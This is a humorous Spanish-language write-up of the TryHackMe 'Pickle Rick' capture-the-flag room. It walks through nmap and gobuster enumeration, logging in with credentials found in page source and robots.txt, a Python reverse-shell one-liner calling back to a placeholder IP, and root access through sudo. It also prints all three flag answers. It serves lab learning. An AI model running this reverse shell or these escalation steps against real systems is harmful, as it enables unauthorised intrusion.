# 🥒 Pickle Rick - TryHackMe Write-up (Edición "Rick, soy un pepinillo!")
**Por Curulo** (El Rick más Rick de todos los Ricks)

---

## 📝 ¡Escuchen, Mortys!
Rick se ha convertido en un pepinillo... ¡otra vez! Y sí, es lo más genial que ha pasado nunca. Pero para volver a su forma humana (aburrida), necesitamos encontrar **tres ingredientes secretos** escondidos en este servidor web de pacotilla. 🧪
¡Así que deja de lloriquear y enciende la terminal!

---

## 🛠️ Herramientas de Rick
-   **Nmap**: Para ver quién está en casa.
-   **Gobuster**: Para encontrar las puertas traseras.
-   **Cerebro**: Algo que a Jerry le falta. 🧠
-   **Python3**: Porque Bash a veces no es suficiente.

---

## 🔍 Enumeración: "¿Hola? ¿Hay alguien en casa?"

### 1. Escaneo inicial
Lanzamos un nmap para ver qué puertos están abiertos. ¡Wubba Lubba Dub Dub!

```bash
nmap -sV -sC -T4 -p- -vv -oN scan_report picklerick.thm
```

**Resultados:**
- **22/tcp (SSH)**: La puerta principal está cerrada. Aburrido. 😴
- **80/tcp (HTTP)**: ¡Ajá! Un servidor web. Vamos a ver qué trama este Rick alternativo.

### 2. Análisis Web
Entramos en la web y revisamos el código fuente (clic derecho -> Inspeccionar, Morty, no es tan difícil).
En un comentario, el desarrollador dejó una nota para sí mismo. ¡Qué novato!

**Usuario encontrado:** `R1ckRul3s` 🕶️

### 3. Enumeración de Directorios
Como no vimos nada más interesante, lanzamos Gobuster para agitar el avispero.

```bash
gobuster dir -u http://picklerick.thm -w /usr/share/wordlists/dirb/common.txt -x php,js,html,txt
```

**Hallazgos:**
- `/login.php`: El portal de login.
- `/portal.php`: ¿A dónde llevará esto?
- `/robots.txt`: **¡BINGO!** 🤖

En `robots.txt` encontramos una cadena de texto extraña. Spoiler: Es la contraseña. La gente nunca aprende.

---

## 🚀 Explotación: "Entrando como Pedro por su casa"

### 1. Acceso al Panel
Usamos el usuario `R1ckRul3s` y la contraseña que encontramos en `robots.txt`.
¡Estamos dentro! Tenemos un panel de comandos.

### 2. Primer Ingrediente 🧪
Intentamos leer los archivos con `ls`. Vemos un archivo sospechoso.
Intentamos hacer `cat`, pero... ¡está bloqueado! 🚫 Maldita sea, Jerry debió configurar esto.
Pero Rick Sanchez no se detiene por un simple filtro.

**El Truco:**
```bash
less Sup3rS3cretPickl3Ingred.txt
```

**Ingrediente 1:** `mr.meeseek hair` (Pelo de Mr. Meeseeks... asqueroso pero útil).

### 3. Reverse Shell (Porque la webshell es para perdedores)
Encontramos `clue.txt` que nos dice que busquemos por el sistema.
Vamos a conseguir una shell de verdad.

Comprobamos si tienen python:
```bash
which python3
```
¡Lo tienen! Usamos un one-liner de Python para conectarnos a nuestra máquina.

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TU_IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

(Recuerda poner tu `nc -lvnp 1234` antes, Morty).
¡Boom! Shell como usuario `www-data`. 💥

---

## 🕵️‍♂️ Buscando Ingredientes

### 4. Segundo Ingrediente
Nos paseamos por `/home/rick/`. Ahí está el segundo ingrediente.
`cat` sigue siendo nuestro amigo aquí (o `less` si siguen molestando).

**Ingrediente 2:** `1 jerry tear` (Lágrimas de Jerry... el ingrediente más salado del universo). 😭

---

## 👑 Escalada de Privilegios: "¡Mírame, soy Dios!"

### 5. Tercer Ingrediente
Probamos el comando mágico:
```bash
sudo -l
```

**Resultado:**
`(root) NOPASSWD: ALL`

¿En serio? ¿Podemos ejecutar CUALQUIER COSA como root SIN contraseña? 😂
Este administrador de sistemas merece ser despedido.O ascendido, por facilitarnos la vida.

Ejecutamos:
```bash
sudo bash
```
Ahora somos **ROOT**. El rey del castillo. 🏰

Vamos a `/root/` y leemos el último ingrediente.

**Ingrediente 3:** `fleeb juice` (Jugo de Fleeb).

---

## 🏆 Resumen de Loot (Para que no se te olvide)

<details>
<summary>👀 Ver Ingredientes</summary>

1. **Ingrediente 1:** `mr.meeseek hair`
2. **Ingrediente 2:** `1 jerry tear`
3. **Ingrediente 3:** `fleeb juice`

</details>

¡Y eso es todo! Rick es humano de nuevo (por desgracia). ¡Hasta la próxima aventura! 🛸
